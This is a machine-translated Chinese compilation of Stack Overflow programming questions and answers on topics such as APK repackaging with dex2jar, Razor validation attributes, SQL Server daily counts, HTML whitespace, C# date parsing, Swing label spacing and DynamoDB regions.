这可能看起来有点奇怪，但我需要实现它。

我有一个**APK**，但我**没有**它的源代码。现在我可以打破 apk ，修改并重新打包它，但是在这样做的同时，我需要将我的自定义 jar 添加到它并让 app/apk 在运行时引用这个库/jar。

如果我只是在 apk 中创建一个文件夹 libs 并将我的 jar 放入其中，我会收到 NoClassDefFound 错误。

知道如何使用 ANT 或任何其他工具来实现它吗？提前感谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-15T11:01:20.007

您在 android 项目中附加的 Jar 不会复制到 APK 中。

发生的事情是，您的 Jar(s) 文件的代码成为您的 Android 代码的一部分。这意味着您不能简单地在 APK 中放置（或复制）Jar 文件。

但是，有办法解决。在 APK 中，您的源代码可以在 classes.dex 文件中找到。

你需要做的是，按照步骤

1 - 使用winRAR解压APK

2 - 使用**dex2jar将 classes.dex 转换为 Jar**

3 - 提取 Jar 文件

4 - 您将在 *.class 中获得源代码，您可以使用**JdGUI**将其转换为 *.java。

现在，您可以创建新的 android 项目并使用代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T10:47:35.370

这是不可能的。所有的类都已经编译好了。您将需要再次“构建”APK，以便重新映射正确的引用。

# razor - HTML 帮助器 TextBoxFor

> ID：16013171
> 
> 赞同：1
> 
> 时间：2013-04-15T10:41:46.563
> 
> 标签：razor, asp.net-mvc-4, validationsummary

我的 cshtlm 页面包含以下代码：

```
@using (Html.BeginForm("Optional", "ConfigurationSilo2", FormMethod.Post, new { id = "storeDataForm" }))
{          
     @Html.TextBoxFor(x => x.Height)  

    <div align="right">
        <input type="submit" id="Avanti" value="@ViewRes.ConfigurationString.buttonNext" name="@ViewRes.ConfigurationString.buttonNext" />
    </div>
} 
```

我的 html 生成的代码是：

```
<form action="/ConfigurationSilo2/Optional" id="storeDataForm" method="post">

     <input data-val="true" data-val-number="The field Height must be a number." data-val-required="The Height field is required." id="Height" name="Height" type="text" value="0" />          
    <div align="right">
        <input type="submit" id="Avanti" value="Next" name="Next" />
    </div>
</form> 
```

这是我的模型代码类：

```
public class Spondina
{
    public int Height { get; set; }
    public int Quantity { get; set; }
    public float UnitPrice { get; set; }
    public float TotalCost { get; set; }
} 
```

为什么我的输入标签中有标签**data-val data-val-number data-val-required ？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T10:48:42.017

这就是 MVC 验证的开始。你的模型上有数据注释吗？我猜`Height`物业有`[Required]`反对吗？这些属性由不显眼的客户端验证框架使用。这是输入助手中添加这些标签的行：

```
tagBuilder.MergeAttributes(htmlHelper.GetUnobtrusiveValidationAttributes(name, metadata)); 
```

有`HtmlHelper`a `ClientValidationRuleFactory`，它在 with 的构造函数中初始化`HtmlHelper`，其中包括 a `ClientDataTypeModelValidatorProvider`，它检查模型的元数据并在模型中的数字类型的情况下应用适当的验证规则，例如。如果您在模型中启用了客户端验证和数字类型，例如`Height`int，则助手将在渲染期间将不显眼的客户端验证注入到这些输入中。

# regex - 检查 Postgres 中的“LIKE”模式是否相交

> ID：16013172
> 
> 赞同：5
> 
> 时间：2013-04-15T10:41:54.247
> 
> 标签：regex, postgresql

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-27T08:58:04.837

> 我想知道这个模式是否相交（有一些字符串匹配它们）。有没有办法做到这一点？...（...）我想检查两个给定模式的字符串集的交集是否不为空。

所以，如果我做对了，给定两个相似的模式 p1 和 p2，你会对是否存在（尚未确定）匹配 p1 和 p2 的字符串感兴趣。

例如：

```
select check_pattern('a%', 'b_'); -- false
select check_pattern('a%', '_b'); -- true ('ab') 
```

你确定一开始就有解决这个问题的通用解决方案吗？

假设有，纯 SQL 不是找到解决方案恕我直言的正确工具，因为您不能轻易地用“这是我的（有限）数据集，加入/过滤它们并基于它产生一个集合”来表达这一点。要在 SQL 术语中找到解决方案，您需要生成源自您的数据的集合，当所讨论的集合是无限的时，这显然不是一个选项。

我认为您想将问题分解为更小的部分并使用诸如 C、Perl、Lisp 之类的过程语言，无论您喜欢什么。

一种可能的解决方案可能是：

*   如果 p1 和 p2 在两端或不同端都是开放的，答案是肯定的：字符串匹配`%foo%`将与匹配的字符串相交`%bar%`，就像字符串匹配`foo%`将与字符串匹配相交一样`%bar`。

*   如果 p1 产生一个有限集（即它包含 no `%`），您可以想象使用`generate_series()`or`for/while/whatever`循环迭代 p1 的整个潜在匹配集，并在每个字符串上尝试 p2 。它丑陋且效率低下，但最终会奏效。

*   如果 p1 和 p2 都被锚定（例如`abc%`and`def%`或`%abc`and `%def`），或合理地锚定（例如`_abc%`and `abcd%`），则通过考虑锚定部分并像前面的情况一样继续，解决方案也足够简单。

*   如果有的话，我会把它留给你来列举和解决剩余的案例......

我认为，关键是确定模式中产生有限字符串集的锚定部分，并坚持检查它们将匹配的（有限）字符串集是否会相交。

# sql - 如何获得每天的总数

> ID：16013175
> 
> 赞同：0
> 
> 时间：2013-04-15T10:42:00.453
> 
> 标签：sql, sql-server, sql-server-2008, tsql

嗨，我有一张如下所示的表格：

```
 Table Name: Emails
    ID        |CreatedDate             |finalStatus
    115173922 |2013-04-09 12:33:23.234 |DELIVERED
    115123432 |2013-04-09 08:21:23.234 |FAILED
    115143212 |2013-04-09 12:24:23.234 |DELIVERED
    115173922 |2013-04-09 05:05:23.234 |DELIVERED
    111233922 |2013-04-10 12:44:23.234 |PENDING
    115123912 |2013-04-10 12:05:23.234 |DELIVERED
    115173922 |2013-04-11 22:09:23.234 |DELIVERED
    111233922 |2013-04-11 13:05:23.234 |PENDING
    115123912 |2013-04-11 05:23:23.234 |DELIVERED 
```

我需要做的是获得该月每天交付、失败和待处理的 finalStatus 的总量。我试图修改人们在以前的答案中给出的 MySQL 代码，例如：[SQL query for Calculating Total No. of Orders per Day？](https://stackoverflow.com/questions/1133109/sql-query-for-calculating-total-no-of-orders-per-day)但一直无法让它工作。

这是我到目前为止的代码：

```
 SELECT DISTINCT  (CAST(CreatedDate as DATE)) as Date,

    (SELECT COUNT(finalStatus)
    FROM [Emails]
    WHERE finalStatus = 'DELIVERED') AS Delivered,

    (SELECT COUNT(finalStatus)
    FROM [Emails]
    WHERE finalStatus = 'FAILED') AS Failed,

    (SELECT COUNT(finalStatus)
    FROM [Emails]
    WHERE finalStatus = 'PENDING') AS Pending

    FROM [Emails]
    GROUP BY (CAST(CreatedDate as DATE)) 
```

如果有人可以帮助我，那就太棒了。我已经坚持了几个小时了，可能很快就会发疯......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T11:01:26.953

既然是这样，就只用`SQL Server 2008`使用铸造`CREATEDDATE`成，`DATE``CAST()`

```
SELECT CAST(E.CreatedDate AS DATE) DateCreated,
       COUNT(case when E.finalStatus = 'DELIVERED' then 1 end) as DELIVERED,
       COUNT(case when E.finalStatus = 'FAILED' then 1 end) as FAILED,
       COUNT(case when E.finalStatus = 'PENDING' then 1 end) as PENDING
FROM    TableName E
GROUP   BY CAST(E.CreatedDate AS DATE) 
```

[http://www.sqlfiddle.com/#!3/dc195/4](http://www.sqlfiddle.com/#!3/dc195/4)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T10:52:29.860

我认为你需要这样的东西：

**[日期名称](http://msdn.microsoft.com/en-us/library/ms174395.aspx)**

```
select CAST(CreatedDate as DATE),
       sum(case when E.finalStatus = 'DELIVERED' then 1 else 0 end) as DELIVERED,
       sum(case when E.finalStatus = 'FAILED' then 1 else 0 end) as FAILED,
       sum(case when E.finalStatus = 'PENDING' then 1 else 0 end) as PENDING
from Emails E
where DATENAME(MONTH,E.CreatedDate)='your month name'
group by CAST(E.CreatedDate as DATE) 
```

**[SQL小提琴](http://www.sqlfiddle.com/#!3/ecf4a/17)**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T10:57:42.747

您可以像这样每个月有所不同：

```
SELECT year(datestart), month(datestart)
finalStatus,
COUNT(finalStatus)
FROM [Emails]
GROUP BY year(datestart), month(datestart),finalStatus 
```

像这样的分组是一种比子查询更快的方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T10:56:46.227

尝试这个

```
 SELECT DISTINCT  (CAST(CreatedDate as DATE)) as Date,

    (SELECT COUNT(finalStatus)
    FROM [Emails] E1
    WHERE finalStatus = 'DELIVERED'  AND 
    CAST(E1.CreatedDate as DATE) = CAST(E.CreatedDate as DATE)) AS Delivered,

    (SELECT COUNT(finalStatus)
    FROM [Emails] E2
    WHERE finalStatus = 'FAILED' AND 
     CAST(E2.CreatedDate as DATE) = CAST(E.CreatedDate as DATE)) AS Failed,

    (SELECT COUNT(finalStatus)
    FROM [Emails] E3
    WHERE finalStatus = 'PENDING' AND 
     CAST(E3.CreatedDate as DATE) = CAST(E.CreatedDate as DATE)) AS Pending

    FROM [Emails] E
    GROUP BY (CAST(CreatedDate as DATE)) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-15T11:11:10.500

```
with daily_figures as
(
select 
 cast(CreatedDate as date) as CreatedDate,
 finalStatus,
 Count(*) as DayCount
From 
  EMails
Group 
  by cast(CreatedDate as date), FinalStatus
)
select * from daily_figures 
Where 
  datepart(month, CreatedDate) = 4 and
  datepart(year, CreatedDate) = 2013 
```

这取决于您的申请情况，您如何提供必要的年份。

[Sql 小提琴](http://sqlfiddle.com/#!3/e07d1/8)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-15T11:17:59.513

如果您只想获取有交易的日期，请*忽略此答案，因为两者`LUV`都`Skinny Pipes` 已经证明了*。

考虑到您想获取整个月份的所有日期`APRIL`，您需要首先生成一个整个月份的日历表，`APRIL`然后将它与您的表连接起来。此查询使用递归 CTE 创建日历。

```
WITH April_Calendar
AS
(
  SELECT CAST('20130401' as datetime) AS [date]
  UNION ALL
  SELECT DATEADD(dd, 1, [date])
  FROM   April_Calendar
  WHERE  DATEADD(dd, 1, [date]) <= '20130430'
)
SELECT  a.[Date] DateCreated,
        COUNT(case when E.finalStatus = 'DELIVERED' then 1 end) as DELIVERED,
        COUNT(case when E.finalStatus = 'FAILED' then 1 end) as FAILED,
        COUNT(case when E.finalStatus = 'PENDING' then 1 end) as PENDING
FROM    April_Calendar a
        LEFT JOIN Emails E
            ON a.[date] = CAST(E.CreatedDate AS DATE)
GROUP   BY a.[Date] 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!3/ecf4a/21)

# html - 处理 HTML 空白

> ID：16013178
> 
> 赞同：0
> 
> 时间：2013-04-15T10:42:10.077
> 
> 标签：html, css, whitespace, removing-whitespace

我想知道是否有任何技术可以用来删除浏览器中显示的空白而不牺牲 HTML 的可读性。

例如，将 HTML 放在不同的行上（使用它时更易于阅读）会在 div/spans/li 之间创建不需要的空白 - 非常令人沮丧。我能看到的唯一方法是将所有 HTML 推送到一行，这使得阅读/编辑和维护成为一场噩梦。

例如看到这些小提琴。

**[Fiddle 1](http://jsfiddle.net/8CsV2/)**具有可读的 HTML，但由于不需要的空白，图像被推到第二行。

**[Fiddle 2](http://jsfiddle.net/Gnuku/1/)**将 HTML 全部放在一行上，令人沮丧，但输出是正确的。

我想知道是否有办法解决这个问题，或者这只是我必须处理的事情？

对我来说，以下代码并不容易使用。

```
<div class="prodGrid">
    <div class="prod"><img src="http://www.sciencebuzz.org/sites/default/files/images/cat_0_0.jpg" alt="text" /></div><div class="prod"><img src="http://www.sciencebuzz.org/sites/default/files/images/cat_0_0.jpg" alt="text" /></div><div class="prod"><img src="http://www.sciencebuzz.org/sites/default/files/images/cat_0_0.jpg" alt="text" /></div></div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T10:45:43.037

有一些[纯 CSS 解决方案](http://css-tricks.com/fighting-the-space-between-inline-block-elements/)，但我不推荐。我更喜欢将标记保留在单独的行上，但使用注释来“删除”空格，[如下所示](http://jsfiddle.net/cherryflavourpez/jWy4s/)：

```
<div class="prodGrid">
    <div class="prod">
        <img src="http://www.sciencebuzz.org/sites/default/files/images/cat_0_0.jpg" alt="text" />  
    </div><!--
    --><div class="prod">
        <img src="http://www.sciencebuzz.org/sites/default/files/images/cat_0_0.jpg" alt="text" />  
    </div><!--
    --><div class="prod">
        <img src="http://www.sciencebuzz.org/sites/default/files/images/cat_0_0.jpg" alt="text" />  
    </div>
</div> 
```

丑得要命，但目前我首选的方法，直到有一个[合适的 CSS 解决方案](http://dev.w3.org/csswg/css-text-4/#white-space-collapsing)。`inline-block`有太多有用的属性不能仅仅因为标记受到轻微影响就放弃它。

**注意**- 如果您确实采用这种方法，请注意 IE7。该浏览器中存在[一个错误](http://robertnyman.com/2009/02/04/how-to-solve-first-child-css-bug-in-ie-7/)，这意味着注释被解释为 DOM 元素。因此，如果您使用一些稍微复杂的选择器，您可能需要采取将所有内容都放在一行上的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:51:47.600

习惯于`vertical-align` `top`你的`img tag`

**像这样**

```
.prod img{vertical-align:top;} 
```

**[演示](http://jsfiddle.net/rohitazad/Gnuku/2/)**

## ----------------

**第二个是这个**

```
.prodGrid{font-size:0;}
.prod img{vertical-align:top;} 
```

**[演示2](http://jsfiddle.net/rohitazad/8CsV2/2/)**

# sql-server-2008 - 数据库日期插入有时有效

> ID：16013181
> 
> 赞同：0
> 
> 时间：2013-04-15T10:42:12.893
> 
> 标签：sql-server-2008, c#-3.0, asp.net-3.5

我有以下行：

```
command.Parameters.Add("@date", SqlDbType.DateTime, 8).Value = date_of_trip; 
```

哪里`date_of_trip`是一个包含`25-9-2013`（即日-月-年）的字符串

这给了我一条错误消息：

> System.ArgumentException：无法将 25-9-2013 转换为 System.DateTime。参数名称：类型---> System.FormatException：字符串未被识别为有效的日期时间。

但是，如果`date_of_trip`是`1-1-2013`，它似乎工作得很好！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:45:55.137

`datetime`在将字符串发送到数据库之前，您应该将其解析为。

例如：

```
DateTime dt;
if(DateTime.TryParse(date_of_trip, out dt))
{
    command.Parameters.Add("@date", SqlDbType.DateTime, 8).Value = dt;
    // ...
}
else
{
    // you should use a CompareValidator to check if it's a valid date
} 
```

如果您想确保即使服务器的当前文化发生变化，您的给定格式也能正常工作，您可以使用`DateTime.TryParseExact`format `"dd-MM-yyyy"`：

```
if (DateTime.TryParseExact(date_of_trip, "dd-MM-yyyy", System.Globalization.CultureInfo.InvariantCulture, System.Globalization.DateTimeStyles.None, out dt))
{
    // ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:43:59.987

我猜这是因为服务器期望第一个参数是一个月。尝试使用真正的 DateTime 或格式 yyyy-mm-dd（即 2013-09-25），这应该始终有效。

# android-intent - 如何以编程方式捕获视频持续时间？

> ID：16013182
> 
> 赞同：1
> 
> 时间：2013-04-15T10:42:13.873
> 
> 标签：android-intent

在我的应用程序中，我正在捕获持续时间为 10 秒的视频。使用 EXTRA_DURATION_LIMIT 方法。我的代码在索尼 2.3 中完美运行。但在 htc 和 lg 等其他 obile 中，我的持续时间延长了 10 秒以上......如何纠正

我的代码是：

```
Intent videoIntent = new Intent(MediaStore.ACTION_VIDEO_CAPTURE);
videoIntent.putExtra(MediaStore.EXTRA_DURATION_LIMIT, limit);
videoIntent.putExtra(MediaStore.EXTRA_VIDEO_QUALITY, 0);
startActivityForResult(videoIntent, ACTION_TAKE_VIDEO); 
```

有没有其他方法来限制持续时间？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-02T12:00:05.667

你可以这样使用

```
 Intent intent = new Intent(MediaStore.ACTION_VIDEO_CAPTURE);

            Uri videofileuri = getOutputMediaFileUri(MEDIA_TYPE_VIDEO);  // create a file to save the video
            intent.putExtra(MediaStore.EXTRA_OUTPUT,videofileuri);  // set the image file name
            intent.putExtra(MediaStore.EXTRA_VIDEO_QUALITY, 1); 
            intent.putExtra(MediaStore.EXTRA_DURATION_LIMIT,10);

            // start the Video Capture Intent
            startActivityForResult(intent, CAPTURE_VIDEO_ACTIVITY_REQUEST_CODE); 
```

# java - 如何消除大尺寸java swing标签中的间隙

> ID：16013184
> 
> 赞同：6
> 
> 时间：2013-04-15T10:42:20.470
> 
> 标签：java, swing, jlabel

在我的应用程序中，我有一个字体大小超过 200 的标签。这个标签包含很大的上下（不规则）间隙。我怎样才能删除它？

这是我的代码：

```
package Core;

import java.awt.Font;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;

import javax.swing.BorderFactory;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;

public class LabelDemo extends JPanel {
    public LabelDemo() {
        super(new GridBagLayout()); 
        JLabel label2;
        GridBagConstraints c = new GridBagConstraints();
        c.gridx = 0;
        c.gridy = 0;
        // Create the other labels.
        label2 = new JLabel("Text-Only Label");
        label2.setBorder(BorderFactory.createTitledBorder("aaaaaaaa"));
        label2.setFont(new Font("Verdana", Font.PLAIN, (int) 220));
        // label2.setBorder(new EmptyBorder(-50, 0, 0, 0));

        // Add the labels.
        add(label2, c);
    }

    /**
     * Create the GUI and show it. For thread safety, this method should be invoked from the event dispatch thread.
     */
    private static void createAndShowGUI() {
        // Create and set up the window.
        JFrame frame = new JFrame("LabelDemo");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // Add content to the window.
        frame.add(new LabelDemo());

        // Display the window.
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        // Schedule a job for the event dispatch thread:
        // creating and showing this application's GUI.
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                // Turn off metal's use of bold fonts
                UIManager.put("swing.boldMetal", Boolean.FALSE);

                createAndShowGUI();
            }
        });
    }
} 
```

我还尝试了我的上一篇文章：[如何改变摇摆标签中的间隙](https://stackoverflow.com/questions/10157704/how-to-change-gap-in-swing-label)并尝试插入，但这在 linux 和 windows 中看起来不同

有没有更好的方法来消除这个差距？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-15T11:55:07.563

[`JDigit`](https://stackoverflow.com/a/4151403/230513)可能会给你一些想法：

*   它覆盖`paintComponent()`了对高分辨率进行下采样`BufferedImage`并控制几何形状。

*   它用于`setBorderPainted(false)`设置`borderPainted`属性。

*   它使用`FocusHandler`自定义突出显示。

![图片](https://i.stack.imgur.com/ffDYr.png)

附录：如此[处](https://stackoverflow.com/a/16246509/230513)所述，根本问题是字体的*前导*，定义[`FontMetrics`](http://docs.oracle.com/javase/7/docs/api/java/awt/FontMetrics.html)为包含在字体的高度中。正如@Guillaume Polet 在评论中所建议的那样，您可以在自己的`JComponent`. `TextLayout`，在[这里](https://stackoverflow.com/a/5998117/230513)讨论，可用于计算边界，如下所示。

优点：

*   绝对控制布局。

*   `TexteLayout`基于的边界几何`FontMetrics`。

缺点：

*   没有`Icon`支持。

*   不支持 HTML。

请注意，`JComponent`作者“建议您将组件放在 a 中`JPanel`并在 . 上设置边框” `JPanel`。

![无铅图片](https://i.stack.imgur.com/qsVdR.png)

```
import java.awt.Dimension;
import java.awt.EventQueue;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.Rectangle;
import java.awt.font.FontRenderContext;
import java.awt.font.TextLayout;
import javax.swing.BorderFactory;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JPanel;

/**
 * @see https://stackoverflow.com/a/16014525/230513
 */
public class UnleadedTest {

    private static class Unleaded extends JComponent {

        private Font font = new Font("Verdana", Font.PLAIN, 144);
        private FontRenderContext frc = new FontRenderContext(null, true, true);
        private String text;
        private TextLayout layout;
        private Rectangle r;

        public Unleaded(String text) {
            this.text = text;
            calcBounds();
        }

        @Override
        public Dimension getPreferredSize() {
            return new Dimension(r.width, r.height);
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            Graphics2D g2d = (Graphics2D) g;
            calcBounds();
            layout.draw(g2d, -r.x, -r.y);
        }

        private void calcBounds() {
            layout = new TextLayout(text, font, frc);
            r = layout.getPixelBounds(null, 0, 0);
        }
    }

    private void display() {
        JFrame f = new JFrame("Unleaded");
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        Unleaded label = new Unleaded("Unleaded");

        JPanel panel = new JPanel();
        panel.setBorder(BorderFactory.createTitledBorder("Title"));
        panel.add(label);
        f.add(panel);
        f.pack();
        f.setLocationRelativeTo(null);
        f.setVisible(true);
    }

    public static void main(String[] args) {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                new UnleadedTest().display();
            }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-26T23:11:39.393

这样做的“正确方法”是扩展“BasicLabelUI”并覆盖“受保护的字符串 layoutCL()”方法。这是负责布置标签内所有内容的方法，并在调用 JLabel 的“getPreferredSize()”时调用。所以这个方法决定了组件的高度。

如果您向下钻取足够深，您将看到高度由 SwingUtilities:1021 类（由 layoutCL 使用）中的以下行确定：

```
textR.height = fm.getHeight(); 
```

所以标签不会导致空白，字体是。标签正好符合 FontMetrics 对象所说的那个大小的字体的最大高度。

最简单的方法可能是作弊；强制尺寸计算做它不应该做的事情。下面是您的示例，其中包含您可以试验的自定义 LabelUI 组件。例如，如果您将变量强制为“dy”到“-40”，则文本将位于顶部。如果你想让一些东西更耐用，你可以检查标签字符串中的所有字母，测量它们的最大高度并在 layoutCL 方法中使用它。但这显然是更多的工作。

```
package Core;

import sun.swing.SwingUtilities2;
import javax.swing.*;
import javax.swing.plaf.LabelUI;
import javax.swing.plaf.basic.BasicLabelUI;
import javax.swing.text.View;
import java.awt.*;

public class LabelDemo extends JPanel {

    public LabelDemo() {
        super(new GridBagLayout());
        JLabel label2;
        GridBagConstraints c = new GridBagConstraints();
        c.gridx = 0;
        c.gridy = 0;
        // Create the other labels.
        label2 = new JLabel("Text-Only Label");
        label2.setVerticalAlignment(SwingUtilities.TOP);
        label2.setVerticalTextPosition(SwingUtilities.TOP);
        label2.setUI(SkinnyLabelUI.createUI(label2));
        label2.setBorder(BorderFactory.createTitledBorder("aaaaaaaa"));
        label2.setFont(new Font("Verdana", Font.PLAIN, (int) 220));
        // label2.setBorder(new EmptyBorder(-50, 0, 0, 0));

        // Add the labels.
        add(label2, c);
    }

    /**
     * Create the GUI and show it. For thread safety, this method should be
     * invoked from the event dispatch thread.
     */
    private static void createAndShowGUI() {
        // Create and set up the window.
        JFrame frame = new JFrame("LabelDemo");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // Add content to the window.
        frame.add(new LabelDemo());

        // Display the window.
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        // Schedule a job for the event dispatch thread:
        // creating and showing this application's GUI.
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                // Turn off metal's use of bold fonts
                UIManager.put("swing.boldMetal", Boolean.FALSE);

                createAndShowGUI();
            }
        });
    }

    private static class SkinnyLabelUI extends BasicLabelUI {

        private static final SkinnyLabelUI labelUI = new SkinnyLabelUI();

        public static LabelUI createUI(JComponent c) {
            return labelUI;
        }

        protected String layoutCL(
            JLabel label,
            FontMetrics fm,
            String text,
            Icon icon,
            Rectangle viewR,
            Rectangle iconR,
            Rectangle textR) {
            int verticalAlignment = label.getVerticalAlignment();
            int horizontalAlignment = label.getHorizontalAlignment();
            int verticalTextPosition = label.getVerticalTextPosition();
            int horizontalTextPosition = label.getHorizontalTextPosition();

            if (icon != null) {
                iconR.width = icon.getIconWidth();
                iconR.height = icon.getIconHeight();
            } else {
                iconR.width = iconR.height = 0;
            }

            /* Initialize the text bounds rectangle textR.  If a null
             * or and empty String was specified we substitute "" here
             * and use 0,0,0,0 for textR.
             */

            boolean textIsEmpty = (text == null) || text.equals("");
            int lsb = 0;
            int rsb = 0;
            /* Unless both text and icon are non-null, we effectively ignore
             * the value of textIconGap.
             */
            int gap;

            View v;
            if (textIsEmpty) {
                textR.width = textR.height = 0;
                text = "";
                gap = 0;
            } else {
                int availTextWidth;
                gap = (icon == null) ? 0 : label.getIconTextGap();

                if (horizontalTextPosition == SwingUtilities.CENTER) {
                    availTextWidth = viewR.width;
                } else {
                    availTextWidth = viewR.width - (iconR.width + gap);
                }
                v = (label != null) ? (View) label.getClientProperty("html") : null;
                if (v != null) {
                    textR.width = Math.min(availTextWidth,
                        (int) v.getPreferredSpan(View.X_AXIS));
                    textR.height = (int) v.getPreferredSpan(View.Y_AXIS);
                } else {
                    textR.width = SwingUtilities2.stringWidth(label, fm, text);
                    lsb = SwingUtilities2.getLeftSideBearing(label, fm, text);
                    if (lsb < 0) {
                        // If lsb is negative, add it to the width and later
                        // adjust the x location. This gives more space than is
                        // actually needed.
                        // This is done like this for two reasons:
                        // 1\. If we set the width to the actual bounds all
                        //    callers would have to account for negative lsb
                        //    (pref size calculations ONLY look at width of
                        //    textR)
                        // 2\. You can do a drawString at the returned location
                        //    and the text won't be clipped.
                        textR.width -= lsb;
                    }
                    if (textR.width > availTextWidth) {
                        text = SwingUtilities2.clipString(label, fm, text,
                            availTextWidth);
                        textR.width = SwingUtilities2.stringWidth(label, fm, text);
                    }
                    textR.height = fm.getHeight();
                    System.out.println("font height: " + textR.height);
                }
            }

            /* Compute textR.x,y given the verticalTextPosition and
             * horizontalTextPosition properties
             */

            if (verticalTextPosition == SwingUtilities.TOP) {
                if (horizontalTextPosition != SwingUtilities.CENTER) {
                    textR.y = 0;
                } else {
                    textR.y = -(textR.height + gap);
                }
            } else if (verticalTextPosition == SwingUtilities.CENTER) {
                textR.y = (iconR.height / 2) - (textR.height / 2);
            } else { // (verticalTextPosition == BOTTOM)
                if (horizontalTextPosition != SwingUtilities.CENTER) {
                    textR.y = iconR.height - textR.height;
                } else {
                    textR.y = (iconR.height + gap);
                }
            }

            if (horizontalTextPosition == SwingUtilities.LEFT) {
                textR.x = -(textR.width + gap);
            } else if (horizontalTextPosition == SwingUtilities.CENTER) {
                textR.x = (iconR.width / 2) - (textR.width / 2);
            } else { // (horizontalTextPosition == RIGHT)
                textR.x = (iconR.width + gap);
            }

            // WARNING: DefaultTreeCellEditor uses a shortened version of
            // this algorithm to position it's Icon. If you change how this
            // is calculated, be sure and update DefaultTreeCellEditor too.

            /* labelR is the rectangle that contains iconR and textR.
             * Move it to its proper position given the labelAlignment
             * properties.
             *
             * To avoid actually allocating a Rectangle, Rectangle.union
             * has been inlined below.
             */
            int labelR_x = Math.min(iconR.x, textR.x);
            int labelR_width = Math.max(iconR.x + iconR.width,
                textR.x + textR.width) - labelR_x;
            int labelR_y = Math.min(iconR.y, textR.y);
            int labelR_height = Math.max(iconR.y + iconR.height,
                textR.y + textR.height) - labelR_y;

            int dx, dy;

            if (verticalAlignment == SwingUtilities.TOP) {
                dy = viewR.y - labelR_y;
            } else if (verticalAlignment == SwingUtilities.CENTER) {
                dy = (viewR.y + (viewR.height / 2)) - (labelR_y + (labelR_height / 2));
            } else { // (verticalAlignment == BOTTOM)
                dy = (viewR.y + viewR.height) - (labelR_y + labelR_height);
            }

            if (horizontalAlignment == SwingUtilities.LEFT) {
                dx = viewR.x - labelR_x;
            } else if (horizontalAlignment == SwingUtilities.RIGHT) {
                dx = (viewR.x + viewR.width) - (labelR_x + labelR_width);
            } else { // (horizontalAlignment == CENTER)
                dx = (viewR.x + (viewR.width / 2))
                    - (labelR_x + (labelR_width / 2));
            }

            /* Translate textR and glypyR by dx,dy.
             */

            textR.x += dx;
            textR.y += dy;

            iconR.x += dx;
            iconR.y += dy;

            if (lsb < 0) {
                // lsb is negative. Shift the x location so that the text is
                // visually drawn at the right location.
                textR.x -= lsb;

                textR.width += lsb;
            }
            if (rsb > 0) {
                textR.width -= rsb;
            }

            return text;
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-01T21:36:38.080

更改边框偏移量可能会有所帮助：

```
int OFFSET_TOP=50,OFFSET_BOTTOM=50;
label.setBorder(new TitledBorder(TITLE){
    @Override
    public Insets getBorderInsets(Component c, Insets insets){
       return new Insets(insets.top - OFFSET_TOP, insets.left, insets.bottom - OFFSET_BOTTOM, insets.right);
    }
}); 
```

# amazon-web-services - DynamoDB 表丢失？

> ID：16013189
> 
> 赞同：2
> 
> 时间：2013-04-15T10:42:38.750
> 
> 标签：amazon-web-services, amazon-dynamodb

我在 dynamo 中创建了一个名为 userId 的简单表，我可以在 AWS 控制台中查看它并通过本地机器上的一些 java 查询它。然而，今天早上，我无法再在 dynamo 仪表板中看到该表，但我仍然可以通过 java.util 查询它。仪表板根本没有显示任何表格（我只有一个，缺少的“userId”）。然后，我使用仪表板创建了一个新表，将其命名为 userId 并填充它。但是，现在当我运行我的 java 来查询它时，代码正在从丢失的“userId”表中返回项目，而不是这个新表！有什么想法吗？

好吧，这很奇怪。我以为发电机表不是按地区指定的，但我注意到一旦我创建了这个新版本的“userId”，它就可以在 eu-west 地区查看，但后来我可以看到美国的不同（以前丢失！）“userId”表-东部地区。它们都有相同的表名，但包含不同的项目。我没想到这是可能的？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-15T17:21:38.333

Amazon Web Services 的大部分服务都在一个区域中。唯一的例外是 Route 53 (DNS) 和 CloudFront (CDN)。原因是您想要控制数据的位置，主要是出于监管原因。很多时候，您的数据无法离开美国或欧洲或任何其他地区。可以在具有可用区的单个区域内为您的服务创建高可用性。这就是 DynamoDB 或 S3 等高可用性服务提供此类功能的方式，方法是在可用区之间但在单个区域内复制日期。

# ios - 动态类类型的分配

> ID：16013191
> 
> 赞同：0
> 
> 时间：2013-04-15T10:42:44.997
> 
> 标签：ios, objective-c, cocoa

我有一个字典，其中包含一个类字符串名称作为键，一个对应的类对象数组作为值。

